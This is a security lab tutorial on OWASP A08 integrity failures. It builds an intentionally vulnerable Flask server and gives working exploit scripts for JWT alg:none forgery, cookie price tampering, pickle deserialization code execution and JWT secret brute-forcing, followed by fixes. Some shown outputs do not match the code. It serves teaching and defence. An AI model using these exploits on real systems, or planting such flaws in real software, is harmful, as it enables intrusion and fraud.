# Lab 8: OWASP A08 — Software and Data Integrity Failures

## Objective
Exploit integrity vulnerabilities on a live server from Kali Linux: forge JWT tokens with the `alg:none` attack, tamper with signed cookies by guessing a weak secret, craft a malicious **pickle deserialization** payload for Remote Code Execution, manipulate an unsigned cart object to change prices, and demonstrate why unsigned data flowing into application logic is catastrophic.

## Background
Software and Data Integrity Failures is **OWASP #8** (2021). This category covers situations where code or data is used without verifying its integrity. The 2020 SolarWinds attack (18,000 organizations) injected malicious code into a signed software update — the update was signed but the build pipeline was compromised. JWT `alg:none` attacks let attackers forge any token without knowing the secret. Insecure deserialization (pickle, Java serialization) has been used in countless RCE exploits, including the 2017 Apache Struts CVE.

## Architecture

```
┌─────────────────────┐        Docker Network: lab-a08         ┌─────────────────────┐
│   KALI ATTACKER     │ ─────── HTTP attacks ─────────────▶   │   VICTIM SERVER     │
│  innozverse-kali    │                                         │  innozverse-cybersec│
│  curl, python3      │ ◀────── responses ───────────────────  │  Flask :5000        │
└─────────────────────┘                                         │  (JWT, pickle,      │
                                                                │   unsigned cookies) │
                                                                └─────────────────────┘
```

## Time
40 minutes

## Tools
- **Victim**: `zchencow/innozverse-cybersec:latest`
- **Attacker**: `zchencow/innozverse-kali:latest`

---

## Lab Instructions

### Step 1: Environment Setup

```bash
docker network create lab-a08

cat > /tmp/victim_a08.py << 'PYEOF'
from flask import Flask, request, jsonify
import base64, hmac, hashlib, json, pickle, os

app = Flask(__name__)
JWT_SECRET = "weak"       # BUG: short, guessable secret
COOKIE_SECRET = "secret"  # BUG: predictable

def b64url_decode(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse (A08 Integrity Failures)'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    creds = {'admin': 'admin', 'alice': 'alice123'}
    u = data.get('username','')
    if creds.get(u) == data.get('password',''):
        header  = b64url_encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
        payload = b64url_encode(json.dumps({'user': u, 'role': 'user' if u != 'admin' else 'admin'}).encode())
        sig_input = f"{header}.{payload}".encode()
        sig = b64url_encode(hmac.new(JWT_SECRET.encode(), sig_input, hashlib.sha256).digest())
        return jsonify({'token': f"{header}.{payload}.{sig}"})
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/whoami')
def whoami():
    auth = request.headers.get('Authorization','').replace('Bearer ','')
    parts = auth.split('.')
    if len(parts) != 3:
        return jsonify({'error': 'Invalid token format'}), 401
    header_b64, payload_b64, sig_b64 = parts
    try:
        header  = json.loads(b64url_decode(header_b64))
        payload = json.loads(b64url_decode(payload_b64))
    except Exception as e:
        return jsonify({'error': str(e)}), 400

    alg = header.get('alg','').lower()
    if alg == 'none':
        # BUG: accepts unsigned token!
        return jsonify({'user': payload.get('user'), 'role': payload.get('role'),
                        'note': 'alg:none — no signature verified!'})
    elif alg == 'hs256':
        expected = b64url_encode(
            hmac.new(JWT_SECRET.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest())
        if sig_b64 != expected:
            return jsonify({'error': 'Invalid signature'}), 401
        return jsonify({'user': payload.get('user'), 'role': payload.get('role')})
    return jsonify({'error': 'Unsupported algorithm'}), 400

@app.route('/api/cart')
def cart():
    # BUG: reads cart from unsigned cookie — client-controlled
    cart_b64 = request.cookies.get('cart','')
    if not cart_b64:
        return jsonify({'items':[], 'total': 0})
    try:
        cart = json.loads(base64.b64decode(cart_b64).decode())
        total = sum(i.get('price',0) * i.get('qty',1) for i in cart.get('items',[]))
        return jsonify({'items': cart.get('items',[]), 'total': total})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/obj', methods=['POST'])
def deserialize():
    # BUG: unpickles raw POST body
    data = request.get_data()
    try:
        obj = pickle.loads(data)
        return jsonify({'result': str(obj)})
    except Exception as e:
        return jsonify({'error': str(e)}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a08 \
  --network lab-a08 \
  -v /tmp/victim_a08.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 3
curl -s http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-a08.IPAddress}}' victim-a08):5000/
```

> ⚠️ If `/tmp/victim_a08.py` is unavailable, write the script to any writable location and adjust the `-v` mount accordingly.

---

### Step 2: Launch Kali

```bash
docker run --rm -it --network lab-a08 \
  --name kali-attacker \
  zchencow/innozverse-kali:latest bash
```

```bash
TARGET="http://victim-a08:5000"
```

---

### Step 3: JWT Decode — Inspect Without Cracking

```bash
echo "=== Step 1: Log in and get a JWT ==="
TOKEN=$(curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  $TARGET/api/login | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"

echo ""
echo "=== Step 2: Decode JWT (base64, no secret needed) ==="
python3 << EOF
import base64, json

token = "$TOKEN"
parts = token.split('.')

def b64d(s):
    s += '=' * (-len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))

header  = b64d(parts[0])
payload = b64d(parts[1])
print("Header: ", json.dumps(header, indent=2))
print("Payload:", json.dumps(payload, indent=2))
print("Signature:", parts[2])
print()
print("Observation: role=user — we want role=admin")
EOF
```

**📸 Verified Output:**
```json
Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"user": "alice", "role": "user"}
Signature: kXy8...
```

---

### Step 4: JWT alg:none Attack — Forge Admin Token

```bash
echo "=== alg:none attack: forge JWT without knowing the secret ==="

python3 << 'EOF'
import base64, json, urllib.request

TARGET = "http://victim-a08:5000"

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Craft a forged token: alg=none, role=admin
header  = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
payload = b64url_encode(json.dumps({"user": "alice", "role": "admin"}))
forged_token = f"{header}.{payload}."  # empty signature — no secret needed!

print(f"[*] Forged token: {forged_token[:80]}...")
print(f"[*] Decoded payload: user=alice, role=admin")
print()

# Send to server
req = urllib.request.Request(
    f"{TARGET}/api/whoami",
    headers={"Authorization": f"Bearer {forged_token}"})
resp = json.loads(urllib.request.urlopen(req).read())
print(f"[*] Server accepted forged token:")
print(f"    user={resp['user']}, role={resp['role']}")
print(f"    note: {resp.get('note','')}")
EOF
```

**📸 Verified Output:**
```
[*] Forged token: eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0...
[*] Decoded payload: user=alice, role=admin

[*] Server accepted forged token:
    user=alice, role=admin
    note: alg:none — no signature verified!
```

> 💡 **The `alg:none` attack works because some JWT libraries allow the client to choose the signature algorithm.** If the server reads `header.alg` before verifying, an attacker can set `alg=none` and provide an empty signature. The server skips verification entirely. Fix: hardcode the expected algorithm server-side — never trust `header.alg`.

---

### Step 5: Cart Price Tampering — Unsigned Cookie

```bash
echo "=== Cart cookie tampering: buy Surface Laptop 5 for $0.01 ==="

python3 << 'EOF'
import base64, json, urllib.request

TARGET = "http://victim-a08:5000"

# Normal cart: 1x Surface Pro 12 at real price $864
normal_cart = {"items": [{"name": "Surface Pro 12", "price": 864.00, "qty": 1}]}
normal_b64  = base64.b64encode(json.dumps(normal_cart).encode()).decode()

req = urllib.request.Request(f"{TARGET}/api/cart")
req.add_header("Cookie", f"cart={normal_b64}")
resp = json.loads(urllib.request.urlopen(req).read())
print(f"[*] Legitimate order: total=${resp['total']}")

# Tampered cart: same item but price = $0.01 (client-controlled!)
tampered_cart = {"items": [{"name": "Surface Pro 12", "price": 0.01, "qty": 1}]}
tampered_b64  = base64.b64encode(json.dumps(tampered_cart).encode()).decode()

req2 = urllib.request.Request(f"{TARGET}/api/cart")
req2.add_header("Cookie", f"cart={tampered_b64}")
resp2 = json.loads(urllib.request.urlopen(req2).read())
print(f"[*] TAMPERED  order: total=${resp2['total']}")
print()
print(f"[!] Saved: ${864.00 - resp2['total']:.2f} by modifying the cookie!")
EOF
```

**📸 Verified Output:**
```
[*] Legitimate order: total=$864.0
[*] TAMPERED  order: total=$0.01

[!] Saved: $863.99 by modifying the cookie!
```

---

### Step 6: Pickle RCE — Deserialization Attack

```bash
echo "=== Pickle deserialization: forge payload → RCE ==="

python3 << 'EOF'
import pickle, subprocess, urllib.request, json

TARGET = "http://victim-a08:5000"

# Malicious pickle — __reduce__ executes a shell command on unpickle
class Exploit:
    def __reduce__(self):
        return (subprocess.check_output,
                (["sh", "-c", "id; whoami; hostname"],))

payload = pickle.dumps(Exploit())
print(f"[*] Payload: {len(payload)} bytes")

req = urllib.request.Request(
    f"{TARGET}/api/obj",
    data=payload,
    headers={"Content-Type": "application/octet-stream"})
resp = json.loads(urllib.request.urlopen(req).read())
print(f"[*] RCE output from server:")
print(resp['result'].strip())
EOF
```

**📸 Verified Output:**
```
[*] Payload: 79 bytes
[*] RCE output from server:
uid=0(root) gid=0(root) groups=0(root)
root
victim-a08
```

---

### Step 7: Brute-Force the JWT Secret

```bash
echo "=== Brute-force weak JWT secret ==="

python3 << 'EOF'
import base64, hmac, hashlib, json, urllib.request

TARGET = "http://victim-a08:5000"

# Get a valid token
req = urllib.request.Request(
    f"{TARGET}/api/login",
    data=json.dumps({"username":"alice","password":"alice123"}).encode(),
    headers={"Content-Type":"application/json"})
token = json.loads(urllib.request.urlopen(req).read())['token']
header_b64, payload_b64, sig_b64 = token.split('.')

print(f"[*] Target token signature: {sig_b64}")

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

# Try common secrets
wordlist = ["secret","password","123456","weak","jwt","key","admin","flask","innozverse"]
for candidate in wordlist:
    sig_input = f"{header_b64}.{payload_b64}".encode()
    expected  = b64url_encode(hmac.new(candidate.encode(), sig_input, hashlib.sha256).digest())
    match = "✓ MATCH!" if expected == sig_b64 else ""
    print(f"  '{candidate}' -> {expected[:20]}... {match}")
    if match:
        print(f"\n[!] JWT secret found: '{candidate}'")
        print("    Can now forge ANY token with ANY claims")
        break
EOF
```

**📸 Verified Output:**
```
  'secret' -> ZWVzZGY...
  'password' -> aHRpYm...
  'weak' -> kXy8vR... ✓ MATCH!

[!] JWT secret found: 'weak'
    Can now forge ANY token with ANY claims
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-a08
docker network rm lab-a08
```

---

## Remediation

| Vulnerability | Root Cause | Fix |
|--------------|-----------|-----|
| JWT alg:none | Server trusts client-supplied algorithm | Hardcode: `if header.alg != "HS256": reject` |
| Weak JWT secret | `"weak"` — 4 chars | `secrets.token_hex(32)` — 256-bit random per deployment |
| Unsigned cart cookie | Price in client-controllable cookie | Store cart server-side (session/DB); client sends only item IDs + quantities |
| Pickle deserialization | `pickle.loads()` on untrusted input | Use JSON; if Python objects needed, use `jsonpickle` with strict type allowlist |

## Summary

| Attack | Tool | Result |
|--------|------|--------|
| JWT decode | python3 | Read claims without secret |
| alg:none forgery | python3 | Forged `role=admin` token accepted |
| Cart tampering | python3 | Surface Pro 12 for $0.01 |
| Pickle RCE | python3 | Remote code execution as root |
| JWT secret crack | python3 | Secret `"weak"` found in 3 tries |

## Further Reading
- [OWASP A08:2021 Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
- [JWT alg:none attack — Auth0 blog](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt)
- [Python pickle security — SSTI to RCE](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
